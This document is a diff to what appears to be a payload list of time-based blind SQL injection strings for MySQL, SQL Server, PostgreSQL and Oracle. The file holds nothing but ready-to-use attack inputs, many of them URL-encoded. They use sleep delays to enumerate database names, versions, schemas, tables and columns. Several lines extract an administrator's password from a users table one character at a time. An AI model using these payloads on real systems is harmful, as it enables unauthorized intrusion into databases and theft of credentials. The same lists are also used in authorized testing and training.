@@ -1,12 +1,91 @@
-# MySQL
 ' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>77,SLEEP(5),0)-- 
-
-# SQL Server
 '; IF(ASCII(SUBSTRING(DB_NAME(),1,1))>77) WAITFOR DELAY '0:0:5'-- 
-
-# PostgreSQL
 ' AND CASE WHEN (ASCII(SUBSTRING((SELECT current_user),1,1))>77) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
-
-# Oracle
+'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>5)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>10)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>15)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>20)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>25)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
 AND CASE WHEN (ASCII(SUBSTR((SELECT USER FROM dual),1,1))>77) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual
 
+
+' AND CASE WHEN (ASCII(SUBSTRING((SELECT current_database()),1,1))>77) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+' AND CASE WHEN (LENGTH(current_database())>5) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+' AND CASE WHEN (ASCII(SUBSTRING((SELECT version()),1,1))>77) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+' AND CASE WHEN ((SELECT COUNT(*) FROM information_schema.schemata)>0) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+' AND CASE WHEN (ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT 1 OFFSET 0),1,1))>77) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+' AND CASE WHEN (ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT 1 OFFSET 1),1,1))>77) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+' AND CASE WHEN ((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')>0) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+' AND CASE WHEN (ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' ORDER BY table_name LIMIT 1 OFFSET 0),1,1))>77) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+' AND CASE WHEN (ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema() ORDER BY table_name LIMIT 1 OFFSET 0),1,1))>77) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+' AND CASE WHEN (ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='public' AND table_name=(SELECT table_name FROM information_schema.tables WHERE table_schema='public' ORDER BY table_name LIMIT 1 OFFSET 0) ORDER BY column_name LIMIT 1 OFFSET 0),1,1))>77) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+' AND CASE WHEN (ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=current_schema() AND table_name=(SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema() ORDER BY table_name LIMIT 1 OFFSET 0) ORDER BY ordinal_position LIMIT 1 OFFSET 0),1,1))>77) THEN pg_sleep(5) ELSE pg_sleep(0) END-- 
+'%3BSELECT+CASE+WHEN+(LENGTH(current_database())%3E5)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+'%3BSELECT+CASE+WHEN+(ASCII(SUBSTRING((SELECT+schema_name+FROM+information_schema.schemata+ORDER+BY+schema_name+LIMIT+1+OFFSET+0),1,1))%3E77)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+'%3BSELECT+CASE+WHEN+EXISTS(SELECT+1+FROM+information_schema.tables+WHERE+table_schema%3D'public'+AND+table_name%3D'users')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+'%3BSELECT+CASE+WHEN+(ASCII(SUBSTRING((SELECT+current_database()),1,1))%3E77)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+'%3BSELECT+CASE+WHEN+(ASCII(SUBSTRING((SELECT+version()),1,1))%3E77)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+'%3BSELECT+CASE+WHEN+((SELECT+COUNT(*)+FROM+information_schema.schemata)%3E0)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+'%3BSELECT+CASE+WHEN+(ASCII(SUBSTRING((SELECT+schema_name+FROM+information_schema.schemata+ORDER+BY+schema_name+LIMIT+1+OFFSET+1),1,1))%3E77)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+'%3BSELECT+CASE+WHEN+((SELECT+COUNT(*)+FROM+information_schema.tables+WHERE+table_schema%3D'public')%3E0)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+'%3BSELECT+CASE+WHEN+(ASCII(SUBSTRING((SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema%3D'public'+ORDER+BY+table_name+LIMIT+1+OFFSET+0),1,1))%3E77)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+'%3BSELECT+CASE+WHEN+(ASCII(SUBSTRING((SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema%3Dcurrent_schema()+ORDER+BY+table_name+LIMIT+1+OFFSET+0),1,1))%3E77)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+'%3BSELECT+CASE+WHEN+(ASCII(SUBSTRING((SELECT+column_name+FROM+information_schema.columns+WHERE+table_schema%3D'public'+AND+table_name%3D(SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema%3D'public'+ORDER+BY+table_name+LIMIT+1+OFFSET+0)+ORDER+BY+column_name+LIMIT+1+OFFSET+0),1,1))%3E77)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+'%3BSELECT+CASE+WHEN+(ASCII(SUBSTRING((SELECT+column_name+FROM+information_schema.columns+WHERE+table_schema%3Dcurrent_schema()+AND+table_name%3D(SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema%3Dcurrent_schema()+ORDER+BY+table_name+LIMIT+1+OFFSET+0)+ORDER+BY+ordinal_position+LIMIT+1+OFFSET+0),1,1))%3E77)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+
+'; IF (LEN(DB_NAME())>5) WAITFOR DELAY '0:0:5'-- 
+'; IF (ASCII(SUBSTRING(DB_NAME(),1,1))>77) WAITFOR DELAY '0:0:5'-- 
+'; IF (ASCII(SUBSTRING(@@version,1,1))>77) WAITFOR DELAY '0:0:5'-- 
+'; IF ((SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA)>0) WAITFOR DELAY '0:0:5'-- 
+'; IF (ASCII(SUBSTRING((SELECT TOP 1 SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA ORDER BY SCHEMA_NAME),1,1))>77) WAITFOR DELAY '0:0:5'-- 
+'; IF ((SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='dbo')>0) WAITFOR DELAY '0:0:5'-- 
+'; IF (ASCII(SUBSTRING((SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='dbo' ORDER BY TABLE_NAME),1,1))>77) WAITFOR DELAY '0:0:5'-- 
+'; IF (ASCII(SUBSTRING((SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='dbo' AND TABLE_NAME=(SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='dbo' ORDER BY TABLE_NAME) ORDER BY ORDINAL_POSITION),1,1))>77) WAITFOR DELAY '0:0:5'-- 
+'%3BIF+(LEN(DB_NAME())%3E5)+WAITFOR+DELAY+'0%3A0%3A10'--
+'%3BIF+(EXISTS(SELECT+1+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA%3D'dbo'+AND+TABLE_NAME%3D'users'))+WAITFOR+DELAY+'0%3A0%3A10'--
+'%3BIF+(ASCII(SUBSTRING(DB_NAME(),1,1))%3E77)+WAITFOR+DELAY+'0%3A0%3A10'--
+'%3BIF+(ASCII(SUBSTRING(@@version,1,1))%3E77)+WAITFOR+DELAY+'0%3A0%3A10'--
+'%3BIF+((SELECT+COUNT(*)+FROM+INFORMATION_SCHEMA.SCHEMATA)%3E0)+WAITFOR+DELAY+'0%3A0%3A10'--
+'%3BIF+(ASCII(SUBSTRING((SELECT+TOP+1+SCHEMA_NAME+FROM+INFORMATION_SCHEMA.SCHEMATA+ORDER+BY+SCHEMA_NAME),1,1))%3E77)+WAITFOR+DELAY+'0%3A0%3A10'--
+'%3BIF+((SELECT+COUNT(*)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA%3D'dbo')%3E0)+WAITFOR+DELAY+'0%3A0%3A10'--
+'%3BIF+(ASCII(SUBSTRING((SELECT+TOP+1+TABLE_NAME+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA%3D'dbo'+ORDER+BY+TABLE_NAME),1,1))%3E77)+WAITFOR+DELAY+'0%3A0%3A10'--
+'%3BIF+(ASCII(SUBSTRING((SELECT+TOP+1+COLUMN_NAME+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_SCHEMA%3D'dbo'+AND+TABLE_NAME%3D(SELECT+TOP+1+TABLE_NAME+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA%3D'dbo'+ORDER+BY+TABLE_NAME)+ORDER+BY+ORDINAL_POSITION),1,1))%3E77)+WAITFOR+DELAY+'0%3A0%3A10'--
+
+' AND CASE WHEN (LENGTH(SYS_CONTEXT(''USERENV'',''DB_NAME''))>5) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual
+' AND CASE WHEN (ASCII(SUBSTR(SYS_CONTEXT(''USERENV'',''DB_NAME''),1,1))>77) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual
+' AND CASE WHEN (ASCII(SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1))>77) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual
+' AND CASE WHEN ((SELECT COUNT(*) FROM all_users)>0) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual
+' AND CASE WHEN (ASCII(SUBSTR((SELECT username FROM (SELECT username FROM all_users ORDER BY username) WHERE ROWNUM=1),1,1))>77) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual
+' AND CASE WHEN ((SELECT COUNT(*) FROM user_tables)>0) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual
+' AND CASE WHEN (ASCII(SUBSTR((SELECT table_name FROM (SELECT table_name FROM user_tables ORDER BY table_name) WHERE ROWNUM=1),1,1))>77) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual
+' AND CASE WHEN (ASCII(SUBSTR((SELECT column_name FROM (SELECT column_name FROM user_tab_columns WHERE table_name=(SELECT table_name FROM (SELECT table_name FROM user_tables ORDER BY table_name) WHERE ROWNUM=1) ORDER BY column_id) WHERE ROWNUM=1),1,1))>77) THEN dbms_pipe.receive_message(('a'),5) ELSE NULL END FROM dual
+
+' AND IF(LENGTH(DATABASE())>5,SLEEP(5),0)-- 
+' AND IF(ASCII(SUBSTRING((SELECT VERSION()),1,1))>77,SLEEP(5),0)-- 
+' AND IF((SELECT COUNT(*) FROM information_schema.schemata)>0,SLEEP(5),0)-- 
+' AND IF(ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT 1 OFFSET 0),1,1))>77,SLEEP(5),0)-- 
+' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0,SLEEP(5),0)-- 
+' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name LIMIT 1 OFFSET 0),1,1))>77,SLEEP(5),0)-- 
+' AND IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name=(SELECT table_name FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name LIMIT 1 OFFSET 0) ORDER BY ordinal_position LIMIT 1 OFFSET 0),1,1))>77,SLEEP(5),0)-- 
+'%3BSELECT+IF(LENGTH(DATABASE())%3E5,SLEEP(10),0)--
+'%3BSELECT+IF(EXISTS(SELECT+1+FROM+information_schema.tables+WHERE+table_schema%3DDATABASE()+AND+table_name%3D'users'),SLEEP(10),0)--
+'%3BSELECT+IF(ASCII(SUBSTRING((SELECT+VERSION()),1,1))%3E77,SLEEP(10),0)--
+'%3BSELECT+IF((SELECT+COUNT(*)+FROM+information_schema.schemata)%3E0,SLEEP(10),0)--
+'%3BSELECT+IF(ASCII(SUBSTRING((SELECT+schema_name+FROM+information_schema.schemata+ORDER+BY+schema_name+LIMIT+1+OFFSET+0),1,1))%3E77,SLEEP(10),0)--
+'%3BSELECT+IF((SELECT+COUNT(*)+FROM+information_schema.tables+WHERE+table_schema%3DDATABASE())%3E0,SLEEP(10),0)--
+'%3BSELECT+IF(ASCII(SUBSTRING((SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema%3DDATABASE()+ORDER+BY+table_name+LIMIT+1+OFFSET+0),1,1))%3E77,SLEEP(10),0)--
+'%3BSELECT+IF(ASCII(SUBSTRING((SELECT+column_name+FROM+information_schema.columns+WHERE+table_schema%3DDATABASE()+AND+table_name%3D(SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema%3DDATABASE()+ORDER+BY+table_name+LIMIT+1+OFFSET+0)+ORDER+BY+ordinal_position+LIMIT+1+OFFSET+0),1,1))%3E77,SLEEP(10),0)--
+
+'%3BSELECT+CASE+WHEN+(LENGTH(SYS_CONTEXT(''USERENV'',''DB_NAME''))%3E5)+THEN+dbms_pipe.receive_message(('a'),10)+ELSE+NULL+END+FROM+dual--
+'%3BSELECT+CASE+WHEN+(ASCII(SUBSTR(SYS_CONTEXT(''USERENV'',''DB_NAME''),1,1))%3E77)+THEN+dbms_pipe.receive_message(('a'),10)+ELSE+NULL+END+FROM+dual--
+'%3BSELECT+CASE+WHEN+(ASCII(SUBSTR((SELECT+banner+FROM+v$version+WHERE+ROWNUM%3D1),1,1))%3E77)+THEN+dbms_pipe.receive_message(('a'),10)+ELSE+NULL+END+FROM+dual--
+'%3BSELECT+CASE+WHEN+((SELECT+COUNT(*)+FROM+all_users)%3E0)+THEN+dbms_pipe.receive_message(('a'),10)+ELSE+NULL+END+FROM+dual--
+'%3BSELECT+CASE+WHEN+(ASCII(SUBSTR((SELECT+username+FROM+(SELECT+username+FROM+all_users+ORDER+BY+username)+WHERE+ROWNUM%3D1),1,1))%3E77)+THEN+dbms_pipe.receive_message(('a'),10)+ELSE+NULL+END+FROM+dual--
+'%3BSELECT+CASE+WHEN+((SELECT+COUNT(*)+FROM+user_tables)%3E0)+THEN+dbms_pipe.receive_message(('a'),10)+ELSE+NULL+END+FROM+dual--
+'%3BSELECT+CASE+WHEN+(ASCII(SUBSTR((SELECT+table_name+FROM+(SELECT+table_name+FROM+user_tables+ORDER+BY+table_name)+WHERE+ROWNUM%3D1),1,1))%3E77)+THEN+dbms_pipe.receive_message(('a'),10)+ELSE+NULL+END+FROM+dual--
+'%3BSELECT+CASE+WHEN+(ASCII(SUBSTR((SELECT+column_name+FROM+(SELECT+column_name+FROM+user_tab_columns+WHERE+table_name%3D(SELECT+table_name+FROM+(SELECT+table_name+FROM+user_tables+ORDER+BY+table_name)+WHERE+ROWNUM%3D1)+ORDER+BY+column_id)+WHERE+ROWNUM%3D1),1,1))%3E77)+THEN+dbms_pipe.receive_message(('a'),10)+ELSE+NULL+END+FROM+dual--
